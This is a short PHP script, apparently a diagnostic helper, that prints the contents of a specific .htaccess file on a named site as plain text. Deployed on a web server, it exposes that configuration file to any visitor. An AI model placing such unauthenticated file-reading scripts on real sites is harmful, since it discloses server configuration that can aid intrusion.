<?php
header('Content-Type: text/plain');
$file = '/home/shacartc/sale.theexperthub.in/whatsapp/.htaccess';
if (file_exists($file)) {
    echo file_get_contents($file);
} else {
    echo "NO_FILE";
}
